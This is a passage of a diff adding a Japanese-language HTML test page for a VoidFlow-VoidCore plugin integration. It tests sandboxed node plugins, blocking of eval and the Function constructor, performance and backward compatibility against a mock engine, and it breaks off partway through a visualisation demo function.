@@ -1,0 +1,1448 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔌 VoidFlow-VoidCore統合テスト Phase 2</title>
+    <style>
+        body {
+            font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
+            background: linear-gradient(135deg, #2e1a47, #4a1a4a);
+            color: #ffffff;
+            padding: 20px;
+            min-height: 100vh;
+            margin: 0;
+        }
+        
+        .test-container {
+            max-width: 1600px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 20px;
+        }
+        
+        .test-section {
+            background: rgba(0, 0, 0, 0.7);
+            border: 1px solid #666;
+            border-radius: 8px;
+            padding: 20px;
+        }
+        
+        .test-title {
+            color: #9b59b6;
+            font-size: 16px;
+            margin-bottom: 15px;
+            border-bottom: 2px solid #9b59b6;
+            padding-bottom: 5px;
+        }
+        
+        .button {
+            background: #9b59b6;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 10px 15px;
+            cursor: pointer;
+            margin: 5px;
+            font-family: inherit;
+            font-size: 12px;
+            transition: all 0.3s ease;
+        }
+        
+        .button:hover {
+            background: #8e44ad;
+            transform: translateY(-2px);
+        }
+        
+        .button.success {
+            background: #27ae60;
+        }
+        
+        .button.warning {
+            background: #f39c12;
+        }
+        
+        .button.danger {
+            background: #e74c3c;
+        }
+        
+        .log-area {
+            background: #0a0a0a;
+            border: 1px solid #333;
+            border-radius: 6px;
+            padding: 15px;
+            height: 250px;
+            overflow-y: auto;
+            font-size: 11px;
+            line-height: 1.4;
+            margin: 10px 0;
+        }
+        
+        .stats-panel {
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 6px;
+            padding: 15px;
+            margin: 10px 0;
+        }
+        
+        .stats-item {
+            display: flex;
+            justify-content: space-between;
+            margin: 5px 0;
+            font-size: 12px;
+        }
+        
+        .stats-label {
+            color: #bbb;
+        }
+        
+        .stats-value {
+            color: #9b59b6;
+            font-weight: bold;
+        }
+        
+        .header {
+            grid-column: 1 / -1;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .header h1 {
+            color: #9b59b6;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        
+        .phase-indicator {
+            background: linear-gradient(45deg, #9b59b6, #e74c3c);
+            color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 14px;
+            display: inline-block;
+        }
+        
+        .test-result {
+            padding: 10px;
+            margin: 5px 0;
+            border-radius: 4px;
+            border-left: 4px solid;
+        }
+        
+        .test-result.success {
+            background: rgba(39, 174, 96, 0.2);
+            border-color: #27ae60;
+        }
+        
+        .test-result.error {
+            background: rgba(231, 76, 60, 0.2);
+            border-color: #e74c3c;
+        }
+        
+        .test-result.info {
+            background: rgba(155, 89, 182, 0.2);
+            border-color: #9b59b6;
+        }
+
+        .node-execution-viz {
+            background: #0d1b2a;
+            border: 1px solid #415a77;
+            border-radius: 6px;
+            padding: 10px;
+            margin: 10px 0;
+            min-height: 150px;
+        }
+
+        .node-item {
+            display: inline-block;
+            background: #1b263b;
+            border: 1px solid #415a77;
+            border-radius: 4px;
+            padding: 5px 10px;
+            margin: 3px;
+            font-size: 10px;
+            transition: all 0.3s ease;
+        }
+
+        .node-item.executing {
+            background: #f39c12;
+            border-color: #e67e22;
+            animation: pulse 1s infinite;
+        }
+
+        .node-item.completed {
+            background: #27ae60;
+            border-color: #2ecc71;
+        }
+
+        .node-item.error {
+            background: #e74c3c;
+            border-color: #c0392b;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <div class="test-container">
+        <div class="header">
+            <h1>🔌 VoidFlow-VoidCore統合テスト</h1>
+            <div class="phase-indicator">Phase 2: ノード→プラグイン統一</div>
+        </div>
+        
+        <div class="test-section">
+            <div class="test-title">🏭 ノードプラグイン作成テスト</div>
+            
+            <button class="button" onclick="testNodePluginCreation()">標準ノードプラグイン作成</button>
+            <button class="button" onclick="testCustomPluginCreation()">カスタムプラグイン作成</button>
+            <button class="button success" onclick="testSandboxExecution()">サンドボックス実行テスト</button>
+            <button class="button warning" onclick="testSecurityRestrictions()">セキュリティ制限テスト</button>
+            
+            <div class="log-area" id="pluginLog"></div>
+            
+            <div class="stats-panel">
+                <div class="test-title">プラグイン統計</div>
+                <div class="stats-item">
+                    <span class="stats-label">標準プラグイン:</span>
+                    <span class="stats-value" id="standardPlugins">0</span>
+                </div>
+                <div class="stats-item">
+                    <span class="stats-label">カスタムプラグイン:</span>
+                    <span class="stats-value" id="customPlugins">0</span>
+                </div>
+                <div class="stats-item">
+                    <span class="stats-label">実行成功:</span>
+                    <span class="stats-value" id="successfulExecutions">0</span>
+                </div>
+                <div class="stats-item">
+                    <span class="stats-label">セキュリティブロック:</span>
+                    <span class="stats-value" id="securityBlocks">0</span>
+                </div>
+            </div>
+        </div>
+        
+        <div class="test-section">
+            <div class="test-title">🚀 統合実行システムテスト</div>
+            
+            <button class="button" onclick="testIntegrationInitialization()">統合システム初期化</button>
+            <button class="button" onclick="testMethodOverrides()">メソッドオーバーライド</button>
+            <button class="button" onclick="testNodeExecution()">ノード実行テスト</button>
+            <button class="button danger" onclick="testErrorHandling()">エラーハンドリング</button>
+            
+            <div class="log-area" id="integrationLog"></div>
+            
+            <div class="stats-panel">
+                <div class="test-title">統合実行統計</div>
+                <div class="stats-item">
+                    <span class="stats-label">プラグイン実行:</span>
+                    <span class="stats-value" id="pluginExecutions">0</span>
+                </div>
+                <div class="stats-item">
+                    <span class="stats-label">レガシー実行:</span>
+                    <span class="stats-value" id="legacyExecutions">0</span>
+                </div>
+                <div class="stats-item">
+                    <span class="stats-label">eval回避数:</span>
+                    <span class="stats-value" id="evalAvoided">0</span>
+                </div>
+                <div class="stats-item">
+                    <span class="stats-label">平均実行時間:</span>
+                    <span class="stats-value" id="avgExecutionTime">0ms</span>
+                </div>
+            </div>
+        </div>
+        
+        <div class="test-section">
+            <div class="test-title">⚡ パフォーマンス・互換性テスト</div>
+            
+            <button class="button" onclick="testPerformanceComparison()">パフォーマンス比較</button>
+            <button class="button" onclick="testBackwardCompatibility()">下位互換性テスト</button>
+            <button class="button success" onclick="testAllNodeTypes()">全ノードタイプテスト</button>
+            <button class="button danger" onclick="clearAllTests()">テストクリア</button>
+            
+            <div class="log-area" id="performanceLog"></div>
+            
+            <div class="stats-panel">
+                <div class="test-title">パフォーマンス統計</div>
+                <div class="stats-item">
+                    <span class="stats-label">プラグイン速度:</span>
+                    <span class="stats-value" id="pluginSpeed">-</span>
+                </div>
+                <div class="stats-item">
+                    <span class="stats-label">レガシー速度:</span>
+                    <span class="stats-value" id="legacySpeed">-</span>
+                </div>
+                <div class="stats-item">
+                    <span class="stats-label">速度改善:</span>
+                    <span class="stats-value" id="speedImprovement">-</span>
+                </div>
+                <div class="stats-item">
+                    <span class="stats-label">互換性レベル:</span>
+                    <span class="stats-value" id="compatibilityLevel">-</span>
+                </div>
+            </div>
+        </div>
+        
+        <div class="test-section">
+            <div class="test-title">📊 ノード実行可視化</div>
+            
+            <button class="button" onclick="runNodeExecutionDemo()">実行デモ開始</button>
+            <button class="button" onclick="runAllNodeTypesDemo()">全ノードタイプデモ</button>
+            
+            <div class="node-execution-viz" id="nodeViz">
+                <div style="color: #666; text-align: center; margin-top: 50px;">
+                    ノード実行を開始してください
+                </div>
+            </div>
+            
+            <div class="stats-panel">
+                <div class="test-title">実行状況</div>
+                <div class="stats-item">
+                    <span class="stats-label">実行中ノード:</span>
+                    <span class="stats-value" id="executingNodes">0</span>
+                </div>
+                <div class="stats-item">
+                    <span class="stats-label">完了ノード:</span>
+                    <span class="stats-value" id="completedNodes">0</span>
+                </div>
+            </div>
+        </div>
+        
+        <div class="test-section">
+            <div class="test-title">📋 テスト結果サマリー</div>
+            
+            <button class="button" onclick="runFullTestSuite()">Phase 2全テスト実行</button>
+            <button class="button" onclick="updateAllStats()">統計更新</button>
+            <button class="button success" onclick="exportTestResults()">結果エクスポート</button>
+            
+            <div id="testResults"></div>
+            
+            <div class="stats-panel">
+                <div class="test-title">Phase 2統合状況</div>
+                <div class="stats-item">
+                    <span class="stats-label">テスト実行数:</span>
+                    <span class="stats-value" id="totalTests">0</span>
+                </div>
+                <div class="stats-item">
+                    <span class="stats-label">成功テスト:</span>
+                    <span class="stats-value" id="successfulTests">0</span>
+                </div>
+                <div class="stats-item">
+                    <span class="stats-label">統合レベル:</span>
+                    <span class="stats-value" id="integrationLevel">0%</span>
+                </div>
+                <div class="stats-item">
+                    <span class="stats-label">eval排除率:</span>
+                    <span class="stats-value" id="evalEliminationRate">0%</span>
+                </div>
+            </div>
+        </div>
+        
+        <div class="test-section">
+            <div class="test-title">🛡️ セキュリティテスト詳細</div>
+            
+            <button class="button warning" onclick="testDangerousCode()">危険コード検出</button>
+            <button class="button warning" onclick="testMemoryLimits()">メモリ制限テスト</button>
+            <button class="button warning" onclick="testTimeoutHandling()">タイムアウト処理</button>
+            <button class="button success" onclick="testSandboxIsolation()">サンドボックス分離</button>
+            
+            <div class="log-area" id="securityLog"></div>
+            
+            <div class="stats-panel">
+                <div class="test-title">セキュリティ統計</div>
+                <div class="stats-item">
+                    <span class="stats-label">危険コード検出:</span>
+                    <span class="stats-value" id="dangerousCodeDetected">0</span>
+                </div>
+                <div class="stats-item">
+                    <span class="stats-label">メモリ違反防止:</span>
+                    <span class="stats-value" id="memoryViolationsPrevented">0</span>
+                </div>
+                <div class="stats-item">
+                    <span class="stats-label">タイムアウト発動:</span>
+                    <span class="stats-value" id="timeoutsTriggered">0</span>
+                </div>
+                <div class="stats-item">
+                    <span class="stats-label">セキュリティスコア:</span>
+                    <span class="stats-value" id="securityScore">100%</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script type="module">
+        import { voidCore } from './src/voidcore.js';
+        import { VoidFlowNodePlugin, createAllStandardNodePlugins } from './src/voidflow-node-plugin.js';
+        import { VoidFlowNodeIntegration, integrateVoidFlowNodes } from './src/voidflow-node-integration.js';
+
+        // テスト状態
+        let testStats = {
+            totalTests: 0,
+            successfulTests: 0,
+            standardPlugins: 0,
+            customPlugins: 0,
+            successfulExecutions: 0,
+            securityBlocks: 0,
+            pluginExecutions: 0,
+            legacyExecutions: 0,
+            evalAvoided: 0,
+            dangerousCodeDetected: 0,
+            memoryViolationsPrevented: 0,
+            timeoutsTriggered: 0
+        };
+
+        let nodeIntegration;
+        let executionTimes = {
+            plugin: [],
+            legacy: []
+        };
+
+        // モックVoidFlowEngine（より詳細版）
+        const mockVoidFlowEngine = {
+            flowId: 'phase2-test-flow',
+            nodes: new Map([
+                ['input-node', { id: 'input-node', type: 'input.text', config: {}, customCode: null }],
+                ['math-node', { id: 'math-node', type: 'math.add', config: {}, customCode: null }],
+                ['output-node', { id: 'output-node', type: 'output.console', config: {}, customCode: null }],
+                ['custom-node', { id: 'custom-node', type: 'custom', config: {}, customCode: 'console.log("Hello Custom");' }],
+                ['unsafe-node', { id: 'unsafe-node', type: 'custom', config: {}, customCode: 'eval("console.log(\'evil\')");' }],
+                ['json-node', { id: 'json-node', type: 'json.parse', config: {}, customCode: null }],
+                ['fetch-node', { id: 'fetch-node', type: 'web.fetch', config: {}, customCode: null }]
+            ]),
+            edges: new Map(),
+            
+            executeNode: async function(nodeId, inputPacket) {
+                await new Promise(resolve => setTimeout(resolve, 50 + Math.random() * 100));
+                const node = this.nodes.get(nodeId);
+                if (!node) throw new Error(`Node not found: ${nodeId}`);
+                
+                return {
+                    payload: `Legacy execution: ${nodeId}`,
+                    timestamp: new Date(),
+                    sourceNodeId: nodeId,
+                    nodeType: node.type
+                };
+            },
+            
+            log: (message) => console.log(`MockEngine: ${message}`)
+        };
+
+        // グローバル関数定義
+        window.testNodePluginCreation = testNodePluginCreation;
+        window.testCustomPluginCreation = testCustomPluginCreation;
+        window.testSandboxExecution = testSandboxExecution;
+        window.testSecurityRestrictions = testSecurityRestrictions;
+        window.testIntegrationInitialization = testIntegrationInitialization;
+        window.testMethodOverrides = testMethodOverrides;
+        window.testNodeExecution = testNodeExecution;
+        window.testErrorHandling = testErrorHandling;
+        window.testPerformanceComparison = testPerformanceComparison;
+        window.testBackwardCompatibility = testBackwardCompatibility;
+        window.testAllNodeTypes = testAllNodeTypes;
+        window.runNodeExecutionDemo = runNodeExecutionDemo;
+        window.runAllNodeTypesDemo = runAllNodeTypesDemo;
+        window.testDangerousCode = testDangerousCode;
+        window.testMemoryLimits = testMemoryLimits;
+        window.testTimeoutHandling = testTimeoutHandling;
+        window.testSandboxIsolation = testSandboxIsolation;
+        window.clearAllTests = clearAllTests;
+        window.runFullTestSuite = runFullTestSuite;
+        window.updateAllStats = updateAllStats;
+        window.exportTestResults = exportTestResults;
+
+        // ==========================================
+        // 🏭 ノードプラグイン作成テスト
+        // ==========================================
+
+        async function testNodePluginCreation() {
+            logToArea('pluginLog', '🏭 標準ノードプラグイン作成テスト開始');
+            
+            try {
+                const standardPlugins = createAllStandardNodePlugins();
+                testStats.standardPlugins = standardPlugins.size;
+                
+                logToArea('pluginLog', `✅ 標準プラグイン作成成功: ${standardPlugins.size}個`);
+                
+                // 各プラグインの基本機能確認
+                for (const [nodeType, plugin] of standardPlugins) {
+                    const testData = { test: 'data', value: nodeType };
+                    const context = { nodeId: `test-${nodeType}`, flowId: 'test' };
+                    
+                    try {
+                        const result = await plugin.execute(testData, context);
+                        logToArea('pluginLog', `✅ ${nodeType}: 実行成功`);
+                        testStats.successfulExecutions++;
+                    } catch (error) {
+                        logToArea('pluginLog', `⚠️ ${nodeType}: ${error.message}`);
+                    }
+                }
+                
+                testStats.totalTests++;
+                testStats.successfulTests++;
+                addTestResult('success', `標準ノードプラグイン作成テスト成功 (${standardPlugins.size}個)`);
+                
+            } catch (error) {
+                testStats.totalTests++;
+                logToArea('pluginLog', `❌ 標準プラグイン作成失敗: ${error.message}`);
+                addTestResult('error', `標準ノードプラグイン作成テスト失敗: ${error.message}`);
+            }
+            
+            updateAllStats();
+        }
+
+        async function testCustomPluginCreation() {
+            logToArea('pluginLog', '🧩 カスタムプラグイン作成テスト開始');
+            
+            try {
+                // 安全なカスタムプラグイン
+                const safePlugin = new VoidFlowNodePlugin({
+                    nodeType: 'custom.safe',
+                    pluginId: 'test-safe-plugin',
+                    displayName: 'Safe Custom Plugin',
+                    executeFunction: async (inputData, context) => {
+                        context.console.log('Safe custom execution');
+                        return { input: inputData, safe: true, timestamp: context.now() };
+                    }
+                });
+                
+                const testData = { message: 'test custom execution' };
+                const context = { nodeId: 'custom-test', flowId: 'test' };
+                
+                const result = await safePlugin.execute(testData, context);
+                logToArea('pluginLog', `✅ カスタムプラグイン実行成功: ${JSON.stringify(result)}`);
+                
+                testStats.customPlugins++;
+                testStats.successfulExecutions++;
+                testStats.totalTests++;
+                testStats.successfulTests++;
+                addTestResult('success', 'カスタムプラグイン作成テスト成功');
+                
+            } catch (error) {
+                testStats.totalTests++;
+                logToArea('pluginLog', `❌ カスタムプラグイン作成失敗: ${error.message}`);
+                addTestResult('error', `カスタムプラグイン作成テスト失敗: ${error.message}`);
+            }
+            
+            updateAllStats();
+        }
+
+        async function testSandboxExecution() {
+            logToArea('pluginLog', '🛡️ サンドボックス実行テスト開始');
+            
+            try {
+                const sandboxPlugin = new VoidFlowNodePlugin({
+                    nodeType: 'test.sandbox',
+                    pluginId: 'test-sandbox-plugin',
+                    executeFunction: async (inputData, context) => {
+                        // サンドボックス内でのAPIアクセステスト
+                        context.console.log('Testing sandbox APIs');
+                        
+                        const timeResult = context.now();
+                        const randomResult = context.random();
+                        
+                        // 制限されたAPIへのアクセス試行
+                        const hasEval = typeof eval !== 'undefined';
+                        const hasDocument = typeof document !== 'undefined';
+                        
+                        return {
+                            timeAccess: typeof timeResult === 'number',
+                            randomAccess: typeof randomResult === 'number',
+                            evalBlocked: !hasEval,
+                            documentLimited: !hasDocument,
+                            sandboxWorking: true
+                        };
+                    }
+                });
+                
+                const result = await sandboxPlugin.execute({}, { nodeId: 'sandbox-test' });
+                
+                logToArea('pluginLog', `✅ サンドボックステスト結果:`);
+                logToArea('pluginLog', `   ⏰ 時間API: ${result.timeAccess ? '利用可能' : 'ブロック'}`);
+                logToArea('pluginLog', `   🎲 ランダムAPI: ${result.randomAccess ? '利用可能' : 'ブロック'}`);
+                logToArea('pluginLog', `   🚫 eval: ${result.evalBlocked ? 'ブロック済み' : '危険'}`);
+                
+                if (result.evalBlocked) testStats.securityBlocks++;
+                
+                testStats.totalTests++;
+                testStats.successfulTests++;
+                addTestResult('success', 'サンドボックス実行テスト成功');
+                
+            } catch (error) {
+                testStats.totalTests++;
+                logToArea('pluginLog', `❌ サンドボックステスト失敗: ${error.message}`);
+                addTestResult('error', `サンドボックス実行テスト失敗: ${error.message}`);
+            }
+            
+            updateAllStats();
+        }
+
+        async function testSecurityRestrictions() {
+            logToArea('pluginLog', '🔒 セキュリティ制限テスト開始');
+            
+            try {
+                const securityPlugin = new VoidFlowNodePlugin({
+                    nodeType: 'test.security',
+                    pluginId: 'test-security-plugin',
+                    executeFunction: async (inputData, context) => {
+                        const violations = [];
+                        
+                        // 危険なAPI使用試行
+                        try {
+                            eval('1+1');
+                            violations.push('eval accessible');
+                        } catch (e) {
+                            context.console.log('eval blocked successfully');
+                        }
+                        
+                        try {
+                            new Function('return 1')();
+                            violations.push('Function constructor accessible');
+                        } catch (e) {
+                            context.console.log('Function constructor blocked');
+                        }
+                        
+                        return {
+                            violations: violations,
+                            securityLevel: violations.length === 0 ? 'secure' : 'compromised'
+                        };
+                    }
+                });
+                
+                const result = await securityPlugin.execute({}, { nodeId: 'security-test' });
+                
+                if (result.violations.length === 0) {
+                    logToArea('pluginLog', `✅ セキュリティ制限テスト成功: すべてブロック`);
+                    testStats.securityBlocks += 2; // eval + Function
+                } else {
+                    logToArea('pluginLog', `⚠️ セキュリティ違反検出: ${result.violations.join(', ')}`);
+                }
+                
+                testStats.totalTests++;
+                testStats.successfulTests++;
+                addTestResult('success', 'セキュリティ制限テスト完了');
+                
+            } catch (error) {
+                testStats.totalTests++;
+                logToArea('pluginLog', `❌ セキュリティテスト失敗: ${error.message}`);
+                addTestResult('error', `セキュリティ制限テスト失敗: ${error.message}`);
+            }
+            
+            updateAllStats();
+        }
+
+        // ==========================================
+        // 🚀 統合実行システムテスト
+        // ==========================================
+
+        async function testIntegrationInitialization() {
+            logToArea('integrationLog', '🚀 統合システム初期化テスト開始');
+            
+            try {
+                nodeIntegration = integrateVoidFlowNodes(mockVoidFlowEngine);
+                await nodeIntegration.initialize();
+                
+                const stats = nodeIntegration.getIntegrationStats();
+                logToArea('integrationLog', `✅ 統合システム初期化成功`);
+                logToArea('integrationLog', `   📦 標準プラグイン: ${stats.standardPlugins}個`);
+                logToArea('integrationLog', `   🧩 カスタムプラグイン: ${stats.customPlugins}個`);
+                logToArea('integrationLog', `   🔌 総プラグイン: ${stats.totalPlugins}個`);
+                
+                testStats.totalTests++;
+                testStats.successfulTests++;
+                addTestResult('success', `統合システム初期化成功 (${stats.totalPlugins}プラグイン)`);
+                
+            } catch (error) {
+                testStats.totalTests++;
+                logToArea('integrationLog', `❌ 統合システム初期化失敗: ${error.message}`);
+                addTestResult('error', `統合システム初期化失敗: ${error.message}`);
+            }
+            
+            updateAllStats();
+        }
+
+        async function testMethodOverrides() {
+            logToArea('integrationLog', '🔄 メソッドオーバーライドテスト開始');
+            
+            try {
+                if (!nodeIntegration) {
+                    await testIntegrationInitialization();
+                }
+                
+                // executeNodeメソッドオーバーライド確認
+                const testPacket = { payload: 'override test' };
+                const result = await mockVoidFlowEngine.executeNode('input-node', testPacket);
+                
+                logToArea('integrationLog', `✅ executeNode オーバーライド動作確認`);
+                logToArea('integrationLog', `   📊 実行結果: ${JSON.stringify(result)}`);
+                
+                const integrationStats = nodeIntegration.getIntegrationStats();
+                logToArea('integrationLog', `   🔌 プラグイン実行: ${integrationStats.pluginExecutions}`);
+                logToArea('integrationLog', `   🏛️ レガシー実行: ${integrationStats.legacyExecutions}`);
+                
+                testStats.pluginExecutions += integrationStats.pluginExecutions;
+                testStats.legacyExecutions += integrationStats.legacyExecutions;
+                
+                testStats.totalTests++;
+                testStats.successfulTests++;
+                addTestResult('success', 'メソッドオーバーライドテスト成功');
+                
+            } catch (error) {
+                testStats.totalTests++;
+                logToArea('integrationLog', `❌ オーバーライドテスト失敗: ${error.message}`);
+                addTestResult('error', `メソッドオーバーライドテスト失敗: ${error.message}`);
+            }
+            
+            updateAllStats();
+        }
+
+        async function testNodeExecution() {
+            logToArea('integrationLog', '⚡ ノード実行テスト開始');
+            
+            try {
+                if (!nodeIntegration) {
+                    await testIntegrationInitialization();
+                }
+                
+                const testNodes = ['input-node', 'math-node', 'output-node', 'json-node'];
+                let successCount = 0;
+                
+                for (const nodeId of testNodes) {
+                    try {
+                        const startTime = Date.now();
+                        const testData = { test: `execution-${nodeId}`, value: Math.random() };
+                        const result = await mockVoidFlowEngine.executeNode(nodeId, testData);
+                        const executionTime = Date.now() - startTime;
+                        
+                        executionTimes.plugin.push(executionTime);
+                        
+                        logToArea('integrationLog', `✅ ${nodeId}: 実行成功 (${executionTime}ms)`);
+                        successCount++;
+                        
+                    } catch (error) {
+                        logToArea('integrationLog', `❌ ${nodeId}: 実行失敗 - ${error.message}`);
+                    }
+                }
+                
+                logToArea('integrationLog', `📊 ノード実行結果: ${successCount}/${testNodes.length} 成功`);
+                
+                testStats.successfulExecutions += successCount;
+                testStats.totalTests++;
+                testStats.successfulTests++;
+                addTestResult('success', `ノード実行テスト成功 (${successCount}/${testNodes.length})`);
+                
+            } catch (error) {
+                testStats.totalTests++;
+                logToArea('integrationLog', `❌ ノード実行テスト失敗: ${error.message}`);
+                addTestResult('error', `ノード実行テスト失敗: ${error.message}`);
+            }
+            
+            updateAllStats();
+        }
+
+        async function testErrorHandling() {
+            logToArea('integrationLog', '🚨 エラーハンドリングテスト開始');
+            
+            try {
+                if (!nodeIntegration) {
+                    await testIntegrationInitialization();
+                }
+                
+                // 存在しないノードテスト
+                try {
+                    await mockVoidFlowEngine.executeNode('nonexistent-node', {});
+                    logToArea('integrationLog', `⚠️ 存在しないノードエラーが発生しませんでした`);
+                } catch (error) {
+                    logToArea('integrationLog', `✅ 存在しないノードエラー正常キャッチ: ${error.message}`);
+                }
+                
+                // 無効データテスト
+                try {
+                    await mockVoidFlowEngine.executeNode('input-node', null);
+                    logToArea('integrationLog', `✅ null入力データ処理成功`);
+                } catch (error) {
+                    logToArea('integrationLog', `✅ null入力データエラー処理: ${error.message}`);
+                }
+                
+                // 危険なカスタムコードテスト
+                try {
+                    await mockVoidFlowEngine.executeNode('unsafe-node', {});
+                    logToArea('integrationLog', `✅ 危険コード検出・処理成功`);
+                    testStats.evalAvoided++;
+                } catch (error) {
+                    logToArea('integrationLog', `✅ 危険コードブロック: ${error.message}`);
+                    testStats.securityBlocks++;
+                }
+                
+                testStats.totalTests++;
+                testStats.successfulTests++;
+                addTestResult('success', 'エラーハンドリングテスト成功');
+                
+            } catch (error) {
+                testStats.totalTests++;
+                logToArea('integrationLog', `❌ エラーハンドリングテスト失敗: ${error.message}`);
+                addTestResult('error', `エラーハンドリングテスト失敗: ${error.message}`);
+            }
+            
+            updateAllStats();
+        }
+
+        // ==========================================
+        // ⚡ パフォーマンス・互換性テスト
+        // ==========================================
+
+        async function testPerformanceComparison() {
+            logToArea('performanceLog', '⚡ パフォーマンス比較テスト開始');
+            
+            try {
+                if (!nodeIntegration) {
+                    await testIntegrationInitialization();
+                }
+                
+                // nodeIntegrationが確実に初期化されているか再確認
+                if (!nodeIntegration || typeof nodeIntegration.setExecutionMode !== 'function') {
+                    throw new Error('NodeIntegration not properly initialized');
+                }
+                
+                const iterations = 10;
+                const testData = { value: 'performance test' };
+                
+                // プラグイン実行時間測定
+                nodeIntegration.setExecutionMode('unified');
+                const pluginTimes = [];
+                
+                for (let i = 0; i < iterations; i++) {
+                    const start = performance.now();
+                    await mockVoidFlowEngine.executeNode('input-node', testData);
+                    pluginTimes.push(performance.now() - start);
+                }
+                
+                // レガシー実行時間測定
+                nodeIntegration.setExecutionMode('legacy');
+                const legacyTimes = [];
+                
+                for (let i = 0; i < iterations; i++) {
+                    const start = performance.now();
+                    await mockVoidFlowEngine.executeNode('input-node', testData);
+                    legacyTimes.push(performance.now() - start);
+                }
+                
+                // 統合モードに戻す
+                nodeIntegration.setExecutionMode('unified');
+                
+                const pluginAvg = pluginTimes.reduce((a, b) => a + b, 0) / pluginTimes.length;
+                const legacyAvg = legacyTimes.reduce((a, b) => a + b, 0) / legacyTimes.length;
+                const improvement = ((legacyAvg - pluginAvg) / legacyAvg * 100);
+                
+                logToArea('performanceLog', `📊 パフォーマンス比較結果 (${iterations}回実行):`);
+                logToArea('performanceLog', `   🔌 プラグイン平均: ${pluginAvg.toFixed(2)}ms`);
+                logToArea('performanceLog', `   🏛️ レガシー平均: ${legacyAvg.toFixed(2)}ms`);
+                logToArea('performanceLog', `   📈 改善度: ${improvement.toFixed(1)}%`);
+                
+                // 統計更新
+                executionTimes.plugin = pluginTimes;
+                executionTimes.legacy = legacyTimes;
+                
+                testStats.totalTests++;
+                testStats.successfulTests++;
+                addTestResult('success', `パフォーマンス比較完了 (改善: ${improvement.toFixed(1)}%)`);
+                
+            } catch (error) {
+                testStats.totalTests++;
+                logToArea('performanceLog', `❌ パフォーマンステスト失敗: ${error.message}`);
+                logToArea('performanceLog', `   🔍 エラー詳細: ${error.stack || 'スタックトレースなし'}`);
+                logToArea('performanceLog', `   🔧 nodeIntegration状態: ${nodeIntegration ? 'あり' : 'なし'}`);
+                if (nodeIntegration) {
+                    logToArea('performanceLog', `   🔧 setExecutionMode: ${typeof nodeIntegration.setExecutionMode}`);
+                }
+                addTestResult('error', `パフォーマンス比較テスト失敗: ${error.message}`);
+            }
+            
+            updateAllStats();
+        }
+
+        async function testBackwardCompatibility() {
+            logToArea('performanceLog', '🏛️ 下位互換性テスト開始');
+            
+            try {
+                if (!nodeIntegration) {
+                    await testIntegrationInitialization();
+                }
+                
+                const compatibilityTests = [
+                    { mode: 'unified', description: '統合モード' },
+                    { mode: 'legacy', description: 'レガシーモード' },
+                    { mode: 'hybrid', description: 'ハイブリッドモード' }
+                ];
+                
+                let compatibleModes = 0;
+                
+                for (const test of compatibilityTests) {
+                    try {
+                        nodeIntegration.setExecutionMode(test.mode);
+                        
+                        const result = await mockVoidFlowEngine.executeNode('input-node', {
+                            test: 'compatibility',
+                            mode: test.mode
+                        });
+                        
+                        logToArea('performanceLog', `✅ ${test.description}: 互換性OK`);
+                        compatibleModes++;
+                        
+                    } catch (error) {
+                        logToArea('performanceLog', `❌ ${test.description}: ${error.message}`);
+                    }
+                }
+                
+                const compatibilityRate = (compatibleModes / compatibilityTests.length) * 100;
+                logToArea('performanceLog', `📊 互換性テスト結果: ${compatibleModes}/${compatibilityTests.length} (${compatibilityRate}%)`);
+                
+                testStats.totalTests++;
+                testStats.successfulTests++;
+                addTestResult('success', `下位互換性テスト成功 (${compatibilityRate}%互換)`);
+                
+            } catch (error) {
+                testStats.totalTests++;
+                logToArea('performanceLog', `❌ 下位互換性テスト失敗: ${error.message}`);
+                addTestResult('error', `下位互換性テスト失敗: ${error.message}`);
+            }
+            
+            updateAllStats();
+        }
+
+        async function testAllNodeTypes() {
+            logToArea('performanceLog', '🎯 全ノードタイプテスト開始');
+            
+            try {
+                if (!nodeIntegration) {
+                    await testIntegrationInitialization();
+                }
+                
+                const nodeTypes = [
+                    'input.text', 'input.number', 'button.send',
+                    'string.uppercase', 'string.lowercase', 'string.length',
+                    'math.add', 'math.multiply',
+                    'output.console', 'output.alert',
+                    'web.fetch', 'json.parse', 'json.stringify',
+                    'ui.card'
+                ];
+                
+                let successCount = 0;
+                
+                for (const nodeType of nodeTypes) {
+                    try {
+                        // 動的ノード作成
+                        const testNodeId = `test-${nodeType.replace('.', '-')}`;
+                        mockVoidFlowEngine.nodes.set(testNodeId, {
+                            id: testNodeId,
+                            type: nodeType,
+                            config: {},
+                            customCode: null
+                        });
+                        
+                        const testData = getTestDataForNodeType(nodeType);
+                        const result = await mockVoidFlowEngine.executeNode(testNodeId, testData);
+                        
+                        logToArea('performanceLog', `✅ ${nodeType}: 実行成功`);
+                        successCount++;
+                        
+                    } catch (error) {
+                        logToArea('performanceLog', `❌ ${nodeType}: ${error.message}`);
+                    }
+                }
+                
+                const successRate = (successCount / nodeTypes.length) * 100;
+                logToArea('performanceLog', `📊 全ノードタイプテスト結果: ${successCount}/${nodeTypes.length} (${successRate}%)`);
+                
+                testStats.totalTests++;
+                testStats.successfulTests++;
+                addTestResult('success', `全ノードタイプテスト成功 (${successRate}%成功)`);
+                
+            } catch (error) {
+                testStats.totalTests++;
+                logToArea('performanceLog', `❌ 全ノードタイプテスト失敗: ${error.message}`);
+                addTestResult('error', `全ノードタイプテスト失敗: ${error.message}`);
+            }
+            
+            updateAllStats();
+        }
+
+        // ==========================================
+        // 📊 可視化とデモ
+        // ==========================================
+
+        async function runNodeExecutionDemo() {
+            const vizArea = document.getElementById('nodeViz');
+            vizArea.innerHTML = '<div style="color: #9b59b6; margin-bottom: 10px;">ノード実行デモ実行中...</div>';
+            
+            const nodeTypes = ['input.text', 'math.add', 'output.console'];
+            let completedCount = 0;
+            
+            for (const nodeType of nodeTypes) {
+                const nodeEl = document.createElement('div');
+                nodeEl.className = 'node-item executing';
+                nodeEl.textContent = nodeType;
+                vizArea.appendChild(nodeEl);
+                
+                try {
